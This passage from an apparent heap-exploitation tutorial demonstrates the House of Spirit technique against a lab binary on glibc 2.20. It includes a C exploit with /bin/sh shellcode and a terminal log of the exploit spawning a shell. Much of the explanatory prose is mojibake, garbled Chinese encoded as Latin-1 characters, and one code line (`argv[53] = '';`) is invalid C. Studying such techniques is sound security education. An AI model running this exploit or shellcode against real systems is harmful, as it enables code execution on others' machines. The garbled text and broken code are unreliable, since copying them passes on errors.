Exp:

```c
/* Program to exploit executable 'vuln' using hos technique.
 */
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#define VULNERABLE "./vuln"

/* Shellcode to spwan a shell. Size: 48 bytes - Includes Return Address overwrite */
char scode[] =
        "\xeb\x0e\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xb8\xfd\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90";

int main( void )
{
        int i;
        char * p;
        char argv1[54];
        char * argv[] = { VULNERABLE, argv1, NULL };

        strcpy(argv1,scode);

        /* Overwrite ptr1 in vuln with stack address - 0xbffffdf0. Overwrite local_age in vuln with chunk size - 0x30 */
        strcpy(argv1+48,"\xf0\xfd\xff\xbf\x30"); 

        argv[53] = '';

        /* Execution of the vulnerable program */
        execve( argv[0], argv, NULL );
        return( -1 );
}
```

ä¸Šè¿°ç¨‹åºåœ¨æ”»å‡»è€…å‚æ•°ä¸‹çš„æ ˆçš„å¸ƒå±€


![house-of-spirit](../media/pic/heap/house-of-spirit-after-attack.png)

éšç€æ”»å‡»å‚æ•°è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿”å›åœ°å€æ˜¯å¦‚ä½•è¢«è¦†ç›–çš„ï¼š

Line[3]: ç¼“å†²åŒºæº¢å‡º

è¿™é‡Œæ”»å‡»è€…è¾“å…¥ argv[1] è¢«å¤åˆ¶åˆ°åä¸º name çš„ç¼“å†²åŒºé‡Œé¢ã€‚

å› ä¸ºæ”»å‡»è€…è¾“å…¥çš„æ•°æ®å¤§äº 44ï¼Œå˜é‡çš„ ptr1 å’Œ local_age åˆ†åˆ«è¢«æ ˆåœ°å€å’Œ chunk size è¦†ç›–ã€‚

æ ˆåœ°å€ - 0xbffffdf0 - æ”»å‡»è€…æˆå¼„ glibc malloc è¿”å›è¿™ä¸ªåœ°å€å½“ line[5]è¢«æ‰§è¡Œæ—¶ã€‚

chunk size - 0x30 è¿™ä¸ª chunk size è¢«ç”¨æ¥å½“ line[4]è¢«æ‰§è¡Œæ—¶æˆå¼„ glibc mallocã€‚

Line[4]: æŠŠæ ˆåŒºåŸŸåŠ åˆ° glibc malloc çš„ fast binã€‚

free() è°ƒç”¨ _int_free(). ç°åœ¨ç¼“å†²åŒºæº¢å‡ºå  ptr1 = 0xbffffdf0 (è€Œä¸æ˜¯ 0x804aa08). 

ä»¥ free()çš„ä¸€ä¸ªå‚æ•°è¦†ç›– ptr1 

Overwritten ptr1 is passed as an argument to free(). 

è¿™æ¬ºéª— glibc malloc æ¥ free ä¸€ä¸ªä½äºæ ˆç©ºé—´çš„å†…å­˜åŒºåŸŸã€‚

è¿™ä¸ªæ ˆåŒºåŸŸçš„ size ä¼šè·é‡Šæ”¾ï¼Œæ”»å‡»è€…ä¼šç”¨ 0x30 è¦†ç›–ä½äº ptr1-8+4

å› æ­¤`glibc malloc`å¯¹å¾…è¿™ä¸ª chunk å°±åƒ fast chunk ä¸€æ ·(å› ä¸º 48 < 64)ï¼Œæ„Ÿå…´è¶£çš„ free çŠ¶æ€çš„ chunk ä½äº ç´¢å¼• 4 çš„ fastbinlist çš„å‰ç«¯ã€‚.

Line[5]: æ¢å¤æ ˆåŒºåŸŸ(è¢«æ·»åŠ åœ¨ line[4])

å¯¹ malloc çš„ 40 å­—èŠ‚è¯·æ±‚ä¼šè¢«`checked_request2size()`è½¬åŒ–ä¸º 48 å­—èŠ‚ã€‚

å› ä¸ºå¯ç”¨ size 48 æ˜¯å±äº fast chunk çš„ï¼Œå®ƒçš„å¯¹åº”çš„ fast binlist(ä½äº 4 å·ç´¢å¼•)è¢«æ¢å¤ã€‚

fast bins çš„ç¬¬ä¸€ä¸ª chunk è¢«ç§»é™¤å¹¶è¿”å›ç»™ç”¨æˆ·ã€‚

ç¬¬ä¸€ä¸ª chunk æ— æ‰€è°“ï¼Œä½†æ˜¯æ ˆåŒºåŸŸåœ¨ line[4]æ‰§è¡ŒæœŸé—´è¢«å¢åŠ äº†ã€‚

Line[6]: è¦†ç›–è¿”å›åœ°å€

å¤åˆ¶æ”»å‡»å‚æ•° argv[1] åˆ°ä½ç½®å¼€å§‹äº 0xbffffdf0 çš„æ ˆåŒºåŸŸ(glibc malloc è¿”å›çš„)ã€‚

argv[1]å‰ 16 å­—èŠ‚æ˜¯
\xeb\x0e â€“ 14 å­—èŠ‚è½¬è·³
\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41 â€“ å¡«å……
\xb8\xfd\xff\xbf â€“ ç”¨è¿™ä¸ªå€¼è¦†ç›–å­˜å‚¨åœ¨ stack ä¸Šçš„è¿”å›åœ°å€ã€‚

å› æ­¤å½“ fvuln è¢«æ‰§è¡Œï¼Œeip å°†ä¼šæ˜¯ 0xbffffdb8 - è¿™ä¸ªä½ç½®åŒ…å«è½¬è·³æŒ‡ä»¤æ¥ç€ shellcode ä¼š spwan ä¸€ä¸ª shellï¼

```shell
Sn0rt@warzone:~$ gcc -g -fno-stack-protector -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=~/workspace/glibc/glibc-inst2.20/lib -Wl,--dynamic-linker=~/workspace/glibc/glibc-inst2.20/lib/ld-linux.so.2
Sn0rt@warzone:~$ gcc -g -o exp exp.c
Sn0rt@warzone:~$ ./exp 

PTR1 = [ 0x804a008 ]
PTR1 = [ 0xbffffdf0 ]

AAAAAAAAAAï¿½ï¿½ï¿½ï¿½1ï¿½Ph//shh/binï¿½ï¿½Pï¿½ï¿½Sï¿½
$ ls
cmd  exp  exp.c  print	vuln  vuln.c
$ exit
```

ä¿æŠ¤: ç›®å‰ä¸ºæ­¢è¿˜æ²¡æœ‰å¢åŠ ä¿æŠ¤æŠ€æœ¯ï¼Œä¹Ÿå°±è¯´è¿™ä¸ªæŠ€æœ¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨æœ€æ–°ç‰ˆæœ¬çš„ glibc ä¸Šåˆ©ç”¨å †æº¢å‡ºã€‚

# House of Prime

WIP

# House of Lore

WIP


### reference

[^sploitfun]: [sploitfun](https://sploitfun.wordpress.com/2015/03/04/heap-overflow-using-malloc-maleficarum/)
